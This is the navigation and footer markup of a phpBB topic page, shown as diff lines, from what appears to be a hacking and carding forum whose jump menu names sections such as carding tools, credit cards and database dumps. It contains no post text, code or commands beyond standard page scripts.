+		<label>Sort by <select name="sk" id="sk"><option value="a">Author</option><option value="t" selected="selected">Post time</option><option value="s">Subject</option></select></label> <label><select name="sd" id="sd"><option value="a" selected="selected">Ascending</option><option value="d">Descending</option></select></label>
+		<input type="submit" name="sort" value="Go" class="button2" />
+			</fieldset>
+	</form>
+	<hr />
+
+<div class="action-bar bottom">
+	<div class="buttons">
+		
+			<a href="./posting.php?mode=reply&amp;f=43&amp;t=636" class="button icon-button reply-icon" title="Post a reply">
+			Post Reply		</a>
+	
+			</div>
+
+		<div class="dropdown-container dropdown-button-control topic-tools">
+		<span title="Topic tools" class="button icon-button tools-icon dropdown-trigger dropdown-select"></span>
+		<div class="dropdown hidden">
+			<div class="pointer"><div class="pointer-inner"></div></div>
+			<ul class="dropdown-contents">
+																								<li class="small-icon icon-print"><a href="./viewtopic.php?f=43&amp;t=636&amp;view=print" title="Print view" accesskey="p">Print view</a></li>							</ul>
+		</div>
+	</div>
+
+		
+	
+			<div class="pagination">
+			2 posts
+							&bull; Page <strong>1</strong> of <strong>1</strong>
+					</div>
+		<div class="clear"></div>
+</div>
+
+
+	<p class="jumpbox-return"><a href="./viewforum.php?f=43" class="left-box arrow-left" accesskey="r">Return to “Penetration Tests”</a></p>
+
+
+	<div class="dropdown-container dropdown-container-right dropdown-up dropdown-left dropdown-button-control" id="jumpbox">
+		<span title="Jump to" class="dropdown-trigger button dropdown-select">
+			Jump to		</span>
+		<div class="dropdown hidden">
+			<div class="pointer"><div class="pointer-inner"></div></div>
+			<ul class="dropdown-contents">
+																			<li><a href="./viewforum.php?f=9">Home</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=10">Announcements</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=11">Comments &amp; FeedBack</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=12">Staff Applications</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=13">Technical Support</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=14">Infractions and reporting</a></li>
+																<li><a href="./viewforum.php?f=15">Community</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=16">General Discussion</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=17">Hello World!</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=18">International - No English</a></li>
+																<li><a href="./viewforum.php?f=19">Anonymity</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=20">Discussions about anonymity</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=21">Socks Proxy</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=22">HTTP / HTTPS Proxy</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=23">Proxy Programs / VPN</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=52">RDP / VPS / SERVERS</a></li>
+																<li><a href="./viewforum.php?f=42">Hackers Zone</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=43">Penetration Tests</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=44">Social Engineering Tests</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=45">Exploits</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=46">Tools</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=47">Malware</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=48">Cryptography</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=49">Others</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=50">Hacking Tutorials</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=30">Hacked Accounts and Database Dumps</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=53">Android Moded apk</a></li>
+																<li><a href="./viewforum.php?f=24">Carding Zone</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=25">Carders Home</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=26">Public Carding Tutorials</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=27">Carding Tools</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=28">Carding Proof / Showoff</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=29">Cardable Websites</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=51">Credit Cards</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=31">Help Me</a></li>
+																<li><a href="./viewforum.php?f=32">Market</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=33">I Buy</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=34">I Sell Verified Carders</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=35">I Sell Open Source</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=36">Exchange</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=37">I Service</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=38">Best Carding World Escrow Service</a></li>
+																<li>&nbsp; &nbsp;<a href="./viewforum.php?f=39">Scam Reports</a></li>
+										</ul>
+		</div>
+	</div>
+
+
+
+			</div>
+
+
+<div id="page-footer" role="contentinfo">
+	<div class="navbar" role="navigation">
+	<div class="inner">
+
+	<ul id="nav-footer" class="linklist bulletin" role="menubar">
+		<li class="small-icon icon-home breadcrumbs">
+									<span class="crumb"><a href="./index.php" data-navbar-reference="index">Home</a></span>
+					</li>
+		
+				<li class="rightside">All times are <abbr title="UTC">UTC</abbr></li>
+							<li class="small-icon icon-delete-cookies rightside"><a href="./ucp.php?mode=delete_cookies" data-ajax="true" data-refresh="true" role="menuitem">Delete all board cookies</a></li>
+									<li class="small-icon icon-team rightside" data-last-responsive="true"><a href="./memberlist.php?mode=team" role="menuitem">The team</a></li>					</ul>
+
+	</div>
+</div>
+
+	<div class="copyright">
+				Powered by <a href="https://www.phpbb.com/">phpBB</a>&reg; Forum Software &copy; phpBB Limited
+									</div>
+
+	<div id="darkenwrapper" data-ajax-error-title="AJAX error" data-ajax-error-text="Something went wrong when processing your request." data-ajax-error-text-abort="User aborted request." data-ajax-error-text-timeout="Your request timed out; please try again." data-ajax-error-text-parsererror="Something went wrong with the request and the server returned an invalid reply.">
+		<div id="darken">&nbsp;</div>
+	</div>
+
+	<div id="phpbb_alert" class="phpbb_alert" data-l-err="Error" data-l-timeout-processing-req="Request timed out.">
+		<a href="#" class="alert_close"></a>
+		<h3 class="alert_title">&nbsp;</h3><p class="alert_text"></p>
+	</div>
+	<div id="phpbb_confirm" class="phpbb_alert">
+		<a href="#" class="alert_close"></a>
+		<div class="alert_text"></div>
+	</div>
+</div>
+
+</div>
+
+<div>
+	<a id="bottom" class="anchor" accesskey="z"></a>
+	</div>
+
+<script type="text/javascript" src="./assets/javascript/jquery.min.js?assets_version=6"></script>
+<script type="text/javascript" src="./assets/javascript/core.js?assets_version=6"></script>
+
+
+<script type="text/javascript" src="./styles/prosilver/template/forum_fn.js?assets_version=6"></script>
+
+<script type="text/javascript" src="./styles/prosilver/template/ajax.js?assets_version=6"></script>
+
+
+
+
+</body>
+</html>
